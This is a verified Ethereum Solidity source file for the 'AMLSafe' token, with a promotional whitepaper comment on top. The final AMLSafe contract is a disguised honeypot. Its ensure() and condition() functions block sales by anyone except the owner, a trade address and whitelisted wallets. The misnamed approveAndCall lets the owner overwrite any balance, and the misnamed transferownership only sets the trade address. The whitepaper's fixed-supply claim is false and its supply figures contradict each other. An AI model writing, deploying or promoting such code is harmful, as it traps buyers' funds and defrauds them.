/**
 *Submitted for verification at Etherscan.io on 2022-07-19
*/

/*
WB: www.amlsafetoken.com 
TG: t.me/amlsafetoken  
TW: twitter.com/amlsafetoken

AMLSafe Token

Introduction
The original cryptocurrency, Bitcoin was designed to be peer-to-peer digital cash for transaction purposes. Bitcoin's original purpose is to ease the usability drawbacks characterized by fiat currencies and centralized systems.
Since the emergence of the Bitcoin blockchain, over 5,800 varieties of cryptocurrencies for a wide range of use cases have emerged, and thousands more will emerge in this new decade. Some of the most popular cryptocurrencies after Bitcoin include ETH, XRP, and Litecoin, and they serve their own useful purposes, with the similar fundamentals to Bitcoin, as alternative payment systems to bitcoin.
Currently, it is not easy to pay directly with cryptocurrencies without going through a crypto to fiat exchange first. Beyond solving the problems of spendable cryptocurrencies that can be exchanged for, for example, receiving utility services without exchanging for fiat, the AMLSafe application aims to implement additional functionality such as a multi-signature feature (escrow), the option to send cryptocurrencies to multiple parties at the same time (multi-send), simplified crypto staking, and most importantly an easy-to-use crypto wallet that will enable fast spending, sending and receiving of cryptocurrencies by giving users access to centralized as well as decentralized services all within one mobile wallet application. In a nutshell, AMLSafe wallet will serve as the simplest gateway to interact with cryptocurrencies via DeFi access and all the other features mentioned above.
There are few efficient gateways that make spending cryptocurrencies as easy as spending fiat currencies and the AMLSafe wallet is on a mission to change that. We want to help protect the original idea behind cryptocurrencies and use-cases, with the aim to further help deepen the adoption levels of cryptocurrencies by broadening the gateways that are available to people to spend and receive cryptocurrencies. We want to enable cryptocurrencies to be used as a near-replacement or huge alternative to fiat currencies via a convenient system.
The main reason cryptocurrencies were created is to serve as a digital cash or payment system that can serve as an alternative to fiat currencies or eventually even as a replacement to fiat payment gateways. Since the creation of Bitcoin by Satoshi Nakamoto several use-cases emerged around cryptocurrencies so that they currently serve several purposes ranging from a basic digital transaction, a store of value, a means for accessing the utility of a platform or ecosystem, and in some cases as securities. Hence, with these purpose and functionality driven features of cryptocurrencies, AMLSafe wallet is positioning itself as an important and all-around value provider to the blockchain ecosystem and cryptocurrencies in general by providing storage services for cryptocurrency holders. Given that almost all cryptocurrencies naturally have a digital money capability making them "spendable", AMLSafe wallet primary goal is to ensure convenience and ease of use while storing or transacting with cryptocurrencies.
Currently there are very few ways in which people can spend their crypto assets in their daily living. Instead, most cryptocurrencies sit in exchanges or in cold storage waiting to be pulled back to fiat currency now and then, which generates additional fees for the currency holder. Before now, only the major strides achieved by BitPay and Blockchain.com are being constantly replicated by emerging crypto start-ups and businesses.
Thus, blockchain and cryptocurrencies are still in their early stages, yet retain the power to reshape the way financial transactions are being executed globally. The creation of new and better processes, products, and services via these ideas will take the blockchain and cryptocurrencies mainstream and eventually change the world forever and empower billions of people to transact independently from centralized institutions. However, with any growing technology or market, there is a need for improvement and innovation. The need for a simple and secure platform to aid users to transact with cryptocurrencies via the blockchain technology from start to finish has never been higher.
The development of such a platform is important because only a complete platform that allows users to go beyond just storing and managing their crypto assets will eventually AMLSafe to broader mainstream adoption of cryptocurrencies. Therefore, such a platform would also need to provide means for users to transact these crypto assets seamlessly with each other, either against other crypto assets or against real-world goods and services without the need for fiat. AMLSafe wallet will ensure that all these features are implemented so that users will be able to transact cryptocurrencies at their convenience via user-friendly options for storage, sending, receiving and converting crypto assets to real-world goods and services without the need to interface with fiat currencies at any point. Additionally, the AMLSafe wallet will provide a high-security platform for cryptocurrency enthusiasts save their funds and earn returns on their capital by implementing a simple staking mechanism.
The AMLSafe wallet is built for both personal and business solutions and our team has a strong focus on bringing solutions associated with the shortage of real-world applications to the cryptocurrency market. The creation of the AMLSafe wallet and its accompanying infrastructure and services will allow individuals and businesses to accept most cryptocurrencies just as they would accept cash or credit.

Vision And Mission
AMLSafe wallet is committed to providing a sophisticated easy-to-use crypto wallet application that will enable anyone to store, send, receive, spend, exchange and swap crypto assets at users' convenience. Users will have the option to use a decentralized financial exchange without the need to provide or store user data centrally. AMLSafe Wallet will enable users across the globe to conveniently spend their cryptocurrency assets at any time.
In addition, AMLSafe Wallet will constantly research and provide excellent blockchain technology and cryptocurrency application scenarios that will further the adoption and use cases of cryptocurrencies.

AMLSafe Wallet
AMLSafe is a modern crypto wallet with fiat pairs and instant transaction security checking. Our wallet gives you an opportunity to buy and sell popular cryptocurrencies through fiat pairs. 
Advantages of AMLSafe:
- One seed-phrase for multiple cryptocurrencies.
- It's easy to create and control new wallets.
- Built-in AML/CFT module, which avoids the risks associated with P2P transactions.
- Ability to buy and sell Bitcoin, Ethereum, Tether, Tron and exchange other cryptocurrencies via fiat pairs.
Additionally, users will be retain full control over their private keys and passphrases at all times, which will enable a more secure wallet where the AMLSafe team does not hold custody of users' funds to ensure that there is no single point of failure that will cause a loss of funds of the AMLSafe community.
This feature will allow users to send and receive cryptocurrencies from one wallet to another. Users can check their wallet balances in real-time, and the near-instant settlements will help them to determine the true costs of transactions they are making. Users spending will be capped by their balances with no option to go into debt and the wallet will show an error message whenever one attempts to spend more currency than is available for spending. The "Send 'l -feature will be QR code enabled and automatic copy-paste features of wallet addresses is also included.
Another big problem of the cryptocurrency market that AMLSafe solves is the problem of human readable addresses. Instead of having complicated wallet addresses that are difficult to read let along remember for humans our users will be able to assign names to the addresses they receive or sent cryptocurrency to. This allows users to personalize their cryptocurrency experience and will greatly ease the use of cryptocurrencies in day to day
transactions.
However, the most important feature we want to add to AMLSafe Wallet are re-current payment and subscription-based services options. This is an essential banking feature that to date isn't offered by cryptocurrency wallets. However, recurrent transactions are essential for many businesses and make up a huge market share of transactions.

AMLSafe Token
The AMLSafe Token is the native currency that fuels the products and services that are delivered on AMLSAFE Wallet. Thereby making AMLSafe token a utility token as it will be needed to access some major service areas of AMLSafe Wallet application.
Eight Million AMLSafe Tokens were minted on the Ethereum VM as an ERC20 standard token. The one billion AMLSafe token total supply is a fixed supply. It is designed with a deflationary monetary system whereby 30% of AMLSafe Wallet quarterly profits are used to repurchase AMLSafe from the exchanges to be permanently burnt. AMLSafe Wallet revenue will be generated from all the services offered via the AMLSafe wallet with a quarterly audit report.
Every Quarter, AMLSafe team will conduct an audit of all the earnings from AMLSafe Wallet, after which 30% of the total net profit will be used to buy back a portion of the AMLSafe token, which will be permanently burnt. This process will continue until only
30% of the total AMLSafe supply is left.

AMLSafe Token Features and Use Cases:
- Up to 20% discount on purchases of AMLSafe services if using AMLSafe.
- For example, AMLSafe can be used to pay reduced transaction fees.
- Deflationary Monetary Supply. 30% of AMLSafe Wallet's quarterly profit will be used to buyback and burn AMLSafe token until only 30% of the total supply is left.
- It can be used to trade digital gift cards.

AMLSafe DeFi
The AMLSafe DeFi Access will allow us to create and support the rise of Decentralized Finance as currently being experienced in the crypto space. We hope to offer users access to all unrestricted, customized and user-friendly DeFi apps and other related d-Apps as currently observed on all the Blockchains hosting them. AMLSafe wallet will not only promote individual wealth, it will also ensure individual freedom at various levels such as economic, social, political and otherwise through the rapid adoption of blockchain technology and its associated products and services. With the AMLSafe DeFi Access, users will have easy access to navigate Uniswap, Mooniswap, Pancake Swap; or Balance; and other emerging and promising d-Apps across different Blockchain platforms such as Ethereum, Tron Network or Polkadot and all the other programmable Blockchains that supports the development and hosting of d-Apps that promotes human freedom and ensures convenience through blockchain and cryptocurrencies.

AMLSafe Swap
The AMLSafe Swap feature allows users to instantly swap or exchange their cryptocurrencies for other cryptocurrencies at an instant and very reduced transaction fee at nearly 0% slippage. From time to time, the AMLSafe Cyber Services team will continue to expand the AMLSafe Wallet ecosystem by onboarding new features that will help add more value to users of AMLSafe wallet.
*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract AMLSafe {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
       if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}